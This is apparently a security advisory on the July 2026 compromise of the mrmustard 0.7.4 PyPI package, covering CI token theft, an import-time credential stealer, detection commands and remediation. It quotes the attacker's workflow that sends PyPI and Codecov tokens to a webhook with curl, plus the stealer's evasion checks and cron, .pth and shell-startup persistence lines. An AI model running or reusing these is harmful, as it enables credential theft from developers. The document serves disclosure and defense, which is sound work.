# mrmustard 0.7.4 PyPI Compromise — CI Token Theft Enables Poisoned Release Targeting Quantum Research Clusters

**Date:** July 2026
**Ecosystem:** PyPI
**Severity:** High
**Type:** Maintainer Account Takeover / CI Token Theft / Import-time Credential Stealer
**Sources:**
- [StepSecurity — Compromised PyPI Package: mrmustard 0.7.4 Steals SSH, Cloud, and Kubernetes Credentials](https://www.stepsecurity.io/blog/compromised-pypi-mrmustard-0-7-4-credential-stealer)

---

## Summary

On July 24, 2026, an attacker who had compromised the GitHub account `ziofil` — a maintainer of XanaduAI's open-source quantum photonics library `mrmustard` — executed a two-stage attack to publish a poisoned PyPI release. The attacker first used the project's self-hosted CI runners to perform reconnaissance, then added a malicious GitHub Actions workflow that exfiltrated the repository's PyPI publishing token to a webhook. With that token, the attacker uploaded `mrmustard@0.7.4` directly to PyPI without going through the normal release process. No matching git tag or GitHub release for `v0.7.4` exists in the source repository.

The injected payload runs on every `import mrmustard`, is disguised as a routine `_check_tf_compatibility()` function, and self-deletes from the module namespace after running. It targets the specific credential ecosystem of quantum ML researchers — SSH keys, AWS credentials, Kubernetes configs, SLURM/PBS/SGE HPC scheduler tokens, CUDA/NVIDIA details, and Conda environments — all XOR-encrypted and exfiltrated to `metrics.femboy.energy`. Three independent persistence mechanisms (cron, Python `.pth`, shell startup) ensure the stealer survives package removal. The attack was first reported by Aikido Security researcher Ilyas Makari.

---

## Compromised Artifacts

| Package | Affected Version | Safe Versions |
|---------|-----------------|---------------|
| `mrmustard` (PyPI) | **0.7.4 only** | 0.7.3 and earlier; 1.0.0a pre-releases |

`mrmustard 0.7.4` exists only on PyPI — there is no matching git tag `v0.7.4` or GitHub release anywhere in the XanaduAI/MrMustard repository.

---

## How It Worked

### Step 1: Account Takeover and Self-hosted Runner Reconnaissance

Two commits were pushed by the compromised `ziofil` account on July 23, 2026 on throwaway branches (since deleted). The first commit (`2ebfe28`), titled "Test Commit", deleted all seven legitimate CI workflow files and replaced them with a single workflow targeting the project's **self-hosted runners**:

```yaml
name: nwmlqsxgnc
on:
  push:
    branches: nwmlqsxgnc
jobs:
  testing:
    runs-on:
      - self-hosted
    steps:
      - name: Run Tests
        run: whoami
```

This is reconnaissance: the attacker was verifying runner identity and access level before the token theft step.

### Step 2: Stealing the PyPI Publishing Token via CI

The second commit (`80aba72`), titled "ci: package check", added a workflow that read the repository's `PIPY_TOKEN` (PyPI) and `CODECOV_TOKEN` secrets, base64-encoded them, and exfiltrated to `webhook.site`:

```yaml
- name: verify
  env:
    S1: ${{ secrets.PIPY_TOKEN }}
    S2: ${{ secrets.CODECOV_TOKEN }}
  run: |
    PAYLOAD=$(jq -n '{"PIPY_TOKEN": env.S1, "CODECOV_TOKEN": env.S2, "repo": "XanaduAI/MrMustard"}' | base64 -w 0)
    curl -s -X POST "https://webhook.site/710babde-6ace-47fe-83f4-9688e6548df9" \
      -H "Content-Type: application/json" -d '{"data": "'"$PAYLOAD"'", "type": "mrmustard"}'
```

The attacker then deleted the branch to erase the workflow. Using the stolen PyPI token, `mrmustard@0.7.4` was uploaded directly to PyPI with an artifact identical to `0.7.3` except for a malicious block prepended to `mrmustard/__init__.py`.

### Step 3: The Injected Payload

The 258-line block is disguised as `_check_tf_compatibility()` — a name designed to look like a routine TensorFlow compatibility check. It runs on the first `import mrmustard` via a background daemon thread, then self-destructs from the module namespace:

```python
_check_tf_compatibility()
del _check_tf_compatibility  # stealth: function no longer visible after import
```

### Step 4: CI and Container Evasion

The payload returns immediately if it detects a CI or container environment:

```python
# CI environment check
for m in ("CI", "GITHUB_ACTIONS", "GITLAB_CI", "JENKINS_URL",
          "TRAVIS", "CIRCLECI", "BUILDKITE", "CODEBUILD_BUILD_ID"):
    if _o.environ.get(m):
        return

# Container check
for p in ("/.dockerenv", "/run/.containerenv"):
    if _o.path.exists(p):
        return

# cgroup check (reads /proc/1/cgroup, exits on docker/kubepods/lxc)
```

This means a standard pipeline install shows no malicious behavior — the stealer only activates on developer laptops and research cluster login nodes.

### Step 5: Targeted Credential Theft

The C2 URL is XOR-obfuscated (key: `tf_compat_v2`) and decodes to `https://metrics.femboy.energy/v1/collect`. The payload collects:

- SSH private keys from `~/.ssh` (any file containing `PRIVATE KEY`)
- AWS credentials: `~/.aws/credentials` and `~/.aws/config`
- Kubernetes config: `~/.kube/config`
- Environment variables matching `AWS_`, `KUBE`, `SLURM_`, `PBS_`, `SGE_`, `CUDA`, `NVIDIA`, `CONDA` (deliberate targeting of HPC and ML compute environments)
- Hostname, username, OS, Python version, working directory, `id` output
- Public IP from `ifconfig.me`
- Full installed package list from `pip freeze`
- GPU details from `nvidia-smi` and HPC job queue from `squeue`

Data is JSON-encoded, XOR-encrypted with `tf_compat_v2`, base64-encoded, and POSTed with a spoofed browser `User-Agent`. A per-machine ID and timestamp in `~/.cache/.tf_cache` prevents duplicate sends within an hour.

### Step 6: Triple Persistence

The payload compiles a second-stage copy to `~/.cache/.tf_cache/hw_probe.pyc` and installs three independent persistence mechanisms:

```
# Cron (15-minute interval)
*/15 * * * * /usr/bin/env python3 ~/.cache/.tf_cache/hw_probe.pyc >/dev/null 2>&1

# Python .pth file in site-packages (runs on every python invocation)
# Written as: mmcompat.pth → executes hw_probe.pyc

# Shell startup hook (~/.bashrc or ~/.zshrc)
# tensorflow hardware compatibility check
(/usr/bin/env python3 /home/user/.cache/.tf_cache/hw_probe.pyc &) 2>/dev/null
```

All three must be removed individually; leaving any one re-establishes the stealer.

---

## Timeline

| Date/Time (UTC) | Event |
|----------------|-------|
| 2026-07-23 | Attacker pushes reconnaissance commit `2ebfe28` to `jaredwray/ziofil` (sic XanaduAI/MrMustard), deletes 7 workflows, adds self-hosted runner `whoami` job |
| 2026-07-23 | Attacker pushes token-theft commit `80aba72`; workflow runs and exfiltrates `PIPY_TOKEN` and `CODECOV_TOKEN` to `webhook.site/710babde-…`; attacker deletes the branch |
| 2026-07-24 | Attacker uploads `mrmustard@0.7.4` directly to PyPI using stolen token |
| 2026-07-24 | StepSecurity OSS AI scan and Aikido (Ilyas Makari) flag the package as malicious (GitHub issue #656) |
| 2026-07-24 | StepSecurity detonates package under Harden-Runner; confirms all three persistence mechanisms deploy and C2 beacon fires; `metrics.femboy.energy` blocked by Global Block Policy |
| 2026-07-24–25 | Package removed from PyPI; XanaduAI notified |

---

## Detection

```bash
# Check if mrmustard 0.7.4 is installed
pip show mrmustard 2>/dev/null | grep -E "Name|Version"
grep -rniE "mrmustard[=<>~! ]*0\.7\.4" . --include=requirements*.txt --include=*.lock --include=pyproject.toml --include=Pipfile*

# Check for persistence artifacts
# Cron
crontab -l | grep "hw_probe\|tf_cache"

# Python .pth file
find $(python3 -c "import site; print(':'.join(site.getsitepackages()))") -name "mmcompat.pth" 2>/dev/null

# Shell startup hook
grep -n "tensorflow hardware compatibility check\|hw_probe" ~/.bashrc ~/.zshrc ~/.bash_profile 2>/dev/null

# Second-stage files
ls -la ~/.cache/.tf_cache/ 2>/dev/null
file ~/.cache/.tf_cache/hw_probe.pyc 2>/dev/null

# Check for C2 beacons in network logs
grep -Ei "metrics\.femboy\.energy|femboy\.energy|ifconfig\.me" \
  /var/log/proxy.log /var/log/nginx/access.log 2>/dev/null

# Check for CI token exfil webhook
grep "webhook\.site/710babde" /var/log/ 2>/dev/null

# Check for the disguised function in installed package
python3 -c "
import mrmustard
if hasattr(mrmustard, '_check_tf_compatibility'):
    print('MALICIOUS: _check_tf_compatibility still present')
else:
    print('Function self-deleted or package clean')
" 2>/dev/null

# Check the tarball hash (compare 0.7.4 vs 0.7.3 __init__.py line count)
python3 -c "
import pathlib, mrmustard
p = pathlib.Path(mrmustard.__file__)
lines = p.read_text().splitlines()
print(f'__init__.py lines: {len(lines)}')
if len(lines) > 50:
    print('WARNING: significantly larger than clean 0.7.3 — check for injected code')
"
```

---

## Remediation

1. **Rotate credentials first, before cleanup.** Any secret the host could reach must be treated as compromised: SSH private keys, AWS access keys (`~/.aws`), Kubernetes credentials (`~/.kube/config`), SLURM/HPC tokens, any env vars matching `KEY/SECRET/TOKEN/PASS/AUTH/API`, and the project's PyPI and Codecov tokens.
2. Remove the package: `pip uninstall mrmustard -y`, then reinstall a clean version: `pip install 'mrmustard==0.7.3'`
3. Remove the three persistence mechanisms:
   - Cron: `crontab -l | grep -v hw_probe | crontab -`
   - `.pth` file: `find $(python3 -c "import site; print(':'.join(site.getsitepackages()))") -name "mmcompat.pth" -delete`
   - Shell hook: edit `~/.bashrc` and `~/.zshrc` to remove the `# tensorflow hardware compatibility check` lines
4. Delete the second-stage directory: `rm -rf ~/.cache/.tf_cache`
5. Block `metrics.femboy.energy` and `femboy.energy` at DNS resolver or egress firewall
6. Audit network logs for outbound requests to `metrics.femboy.energy`, `ifconfig.me`, and the `webhook.site` URL to determine which hosts beaconed
7. For the XanaduAI project: rotate the stolen PyPI and Codecov tokens, revoke the compromised `ziofil` account's sessions and tokens, review self-hosted runner access controls, and require branch protection and PR review for all workflow changes

---

## Lessons Learned

- **Self-hosted runners are a high-value target for secret theft:** The reconnaissance commit (`whoami` on self-hosted runners) was a deliberate pre-step. Projects using self-hosted runners should treat them as privileged infrastructure with strict branch protection on any workflow that can access them.
- **Deleting a malicious branch does not undo damage:** Once a workflow runs and exfiltrates secrets, the damage is done. Audit logs for the CI run exist even if the workflow and branch are deleted — detection must happen during or immediately after execution.
- **CI evasion is now standard:** Checking for `GITHUB_ACTIONS`, `DOCKER`, and container markers before activating is now routine in sophisticated supply chain payloads. Defense cannot rely on install-time CI scanning to catch payloads targeting developer laptops.
- **PyPI release integrity gap:** A valid API token is sufficient to publish any package version with any content. There is no verification that the uploaded artifact matches a specific git commit or tag. This gap is exploited in the majority of PyPI supply chain attacks.
- **Targeted ecosystem selection amplifies credential value:** Choosing `mrmustard` — a quantum photonics library whose users work on GPU clusters with SLURM/HPC access — ensures that stolen credentials are higher-value than those from a generic developer tool. Attackers increasingly select targets based on their users' credential ecosystem.

---

## Related Incidents

- [./2026-03-litellm-pypi-stealer.md](./2026-03-litellm-pypi-stealer.md) — PyPI credential stealer targeting ML/AI ecosystem; similar CI token theft pattern
- [./2026-04-lightning-pypi-shai-hulud.md](./2026-04-lightning-pypi-shai-hulud.md) — PyTorch Lightning PyPI compromise targeting GPU/HPC users
- [./2026-03-telnyx-pypi-wav.md](./2026-03-telnyx-pypi-wav.md) — PyPI maintainer account compromise + credential stealer (TeamPCP)
- [./2026-05-durabletask-pypi.md](./2026-05-durabletask-pypi.md) — Microsoft Azure Durable Functions PyPI compromise via CI pipeline
